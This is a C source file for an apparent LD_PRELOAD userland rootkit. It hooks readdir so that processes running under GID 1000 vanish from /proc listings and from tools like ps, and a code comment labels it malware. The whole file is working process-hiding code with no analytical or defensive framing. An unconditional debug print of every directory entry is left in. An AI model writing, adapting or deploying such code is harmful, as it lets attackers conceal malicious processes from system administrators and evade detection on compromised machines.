#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>

#define HIDDEN_GID 1000
static struct dirent *(*original_readdir)(DIR *) = NULL;

int is_all_digits(const char *str)
{
    while (*str)
    {
        if (!isdigit(*str))
            return 0;
        str++;
    }
    return 1;
}

gid_t get_process_gid(pid_t pid)
{
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/status", pid);
    FILE *file = fopen(path, "r");
    if (!file)
        return -1;

    char line[256];
    while (fgets(line, sizeof(line), file))
    {
        if (strncmp(line, "Gid:", 4) == 0)
        {
            fclose(file);
            gid_t gid;
            sscanf(line, "Gid:\t%*d\t%*d\t%*d\t%d", &gid);
            return gid;
        }
    }
    fclose(file);
    return -1;
}

struct dirent *readdir(DIR *dirp)
{
    if (!original_readdir)
    {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
        if (!original_readdir)
        {
#ifdef DEBUG
            printf("Error: dlsym failed to load readdir\n");
#endif
            return NULL;
        }
    }

#ifdef DEBUG
    printf("Inside readdir function...\n");
#endif

    struct dirent *entry;
    while ((entry = original_readdir(dirp)))
    {
        printf("Reading entry: %s\n", entry->d_name);

        // this run malware

        if (!is_all_digits(entry->d_name))
        {
            return entry;
        }

        pid_t pid = atoi(entry->d_name);
        gid_t current_gid = get_process_gid(pid);

        // Hide the directory if its GID matches the HIDDEN_GID
        if (current_gid != HIDDEN_GID)
        {
            return entry;
        }
    }
    return NULL;
}
